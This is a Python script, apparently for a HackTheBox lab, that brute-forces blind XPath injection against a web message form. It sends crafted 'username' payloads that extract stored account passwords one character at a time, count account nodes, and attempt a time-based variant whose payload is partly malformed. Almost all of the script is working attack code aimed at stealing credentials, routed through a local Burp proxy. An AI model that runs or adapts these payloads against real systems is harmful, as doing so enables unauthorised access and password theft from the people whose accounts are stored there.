import requests
from time import sleep

# Keyword Dict
keyword_dict = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","_","-","@",".","!","#","$","%","{","}"]
# Banner
def display_banner():
    print("\n")
    print("╔" + "═"*78 + "╗")
    print("║" + " "*78 + "║")
    print("║" + "         🔍 XPath Node Name Bruteforcer 🔍".center(76) + "║")
    print("║" + " "*78 + "║")
    print("║" + "Made By: 0x001".center(78) + "║")
    print("║" + "Github: https://github.com/Oxooi".center(78) + "║")
    print("║" + "HackTheBox: https://app.hackthebox.com/profile/1158811".center(78) + "║")
    print("║" + " "*78 + "║")
    print("╚" + "═"*78 + "╝")
    print("\n")

# Bruteforcer function
def bruteforcer(target_url):
    # The final word
    resultat = ""
    # The number of errors (Wrong character)
    errors = 0
    
    print("[*] Starting bruteforce...")
    print("[*] Target:", target_url)
    print("-" * 80)
    
    for index in range(50):  # 50 caractères max pour un nom de nœud
        caractere_trouve = False
        
        for caractere in range(len(keyword_dict)):
            # Affichage en temps réel
            print(f"\r[*] Position {index + 1} | Testing: {resultat}{keyword_dict[caractere]}", end='', flush=True)
            
            # The payload to send
            dataPayload = {
                "username": f"invalid' or substring(/accounts/*[1]/password,{index + 1},1)='{keyword_dict[caractere]}' and '1'='1", 
                "msg": "uwulord"
            }
            
            # Proxy to use for debug the payload with BurpSuite
            proxy = {"http": "http://127.0.0.1:8080"}
            
            # The POST request
            try:
                r = requests.post(target_url, data=dataPayload, proxies=proxy, timeout=10)
                
                # If the response status is 200
                if r.status_code == 200:
                    if "Message successfully sent!" in r.text:
                        resultat += keyword_dict[caractere]
                        print(f"\r[+] Position {index + 1} | Found: '{keyword_dict[caractere]}' → Current result: {resultat}")
                        errors = 0
                        caractere_trouve = True
                        break
                    else:
                        errors += 1
                else:
                    print(f"\n[-] Request failed with status code: {r.status_code}")
                    return
                    
            except requests.exceptions.RequestException as e:
                print(f"\n[-] Request error: {e}")
                return
        
        # Si aucun caractère n'a été trouvé pour cette position
        if not caractere_trouve:
            print(f"\r[!] No more characters found after position {index}")
            break
    
    print("\n" + "="*80)
    print(f"[✓] Node name found: {resultat}")
    print("="*80)
    return resultat

# Bruteforcer function
def NumberBruteforcer(target_url):
    # The final word
    resultat = ""
    # The number of errors (Wrong character)
    errors = 0
    
    print("[*] Starting bruteforce...")
    print("[*] Target:", target_url)
    print("-" * 80)
    
    for index in range(50):  # 50 caractères max pour un nom de nœud
        
        # Affichage en temps réel
        print(f"\r[*] Position {index + 1} | Testing: {resultat}", end='', flush=True)
        
        # The payload to send
        dataPayload = {
            "username": f"invalid' or count(/accounts/*)={index} and '1'='1", 
            "msg": "uwulord"
        }
        
        # Proxy to use for debug the payload with BurpSuite
        proxy = {"http": "http://127.0.0.1:8080"}
        
        # The POST request
        try:
            r = requests.post(target_url, data=dataPayload, proxies=proxy, timeout=10)
            
            # If the response status is 200
            if r.status_code == 200:
                if not "User does not exist!" in r.text:
                    resultat += str(index)
                    print(f"\r[+] Position {index + 1} | Found: '{index}' → Current result: {resultat}")
                    errors = 0
                    break
                else:
                    errors += 1
            else:
                print(f"\n[-] Request failed with status code: {r.status_code}")
                return
                
        except requests.exceptions.RequestException as e:
            print(f"\n[-] Request error: {e}")
            return            
    
    print("\n" + "="*80)
    print(f"[✓] Node name found: {resultat}")
    print("="*80)
    return resultat

# TimeBasedBruteforcer function
def TimeBasedBruteforcer(target_url):
    # Possibles node
    node_name = ["account","user"]

    # The final word
    resultat = ""
    # Average Time Response
    time_response = []
    # The number of errors (Wrong character)
    errors = 0
    
    print("[*] Starting time based bruteforce...")
    print("[*] Target:", target_url)
    print("-" * 80)
    
    for index in range(50):  # 50 caractères max pour un nom de nœud
        caractere_trouve = False
        for caractere in range(len(keyword_dict)):
            # Affichage en temps réel
            print(f"\r[*] Position {index + 1} | Testing: {resultat}{keyword_dict[caractere]}{node_name}", end='', flush=True)
            
            # The payload to send
            dataPayload = {
                # "username": f"invalid' or substring(name(/*[1]),{index + 1},1)='{keyword_dict[caractere]}' and '1'='1", 
                "username": f"invalid' or substring(/accounts/{node_name}[2]/username,1,1)='{keyword_dict[caractere]}' and count((//.)[count((//.))]) and '1'='1", 
                "msg": "uwulord"
            }
            
            # Proxy to use for debug the payload with BurpSuite
            proxy = {"http": "http://127.0.0.1:8080"}
            
            # The POST request
            try:
                r = requests.post(target_url, data=dataPayload, proxies=proxy, timeout=10)
                
                # If the response status is 200
                if r.status_code == 200:
                    if "Message successfully sent!" in r.text:
                        resultat += keyword_dict[caractere]
                        print(f"\r[+] Position {index + 1} | Found: '{keyword_dict[caractere]}' → Current result: {resultat}")
                        errors = 0
                        caractere_trouve = True
                        break
                    else:
                        errors += 1
                else:
                    print(f"\n[-] Request failed with status code: {r.status_code}")
                    return
                    
            except requests.exceptions.RequestException as e:
                print(f"\n[-] Request error: {e}")
                return
        
        # Si aucun caractère n'a été trouvé pour cette position
        if not caractere_trouve:
            print(f"\r[!] No more characters found after position {index}")
            break
    
    print("\n" + "="*80)
    print(f"[✓] Node name found: {resultat}")
    print("="*80)
    return resultat


if __name__ == "__main__":
    display_banner()
    #NumberBruteforcer("http://94.237.121.49:49798")
    bruteforcer("http://94.237.51.6:43965/")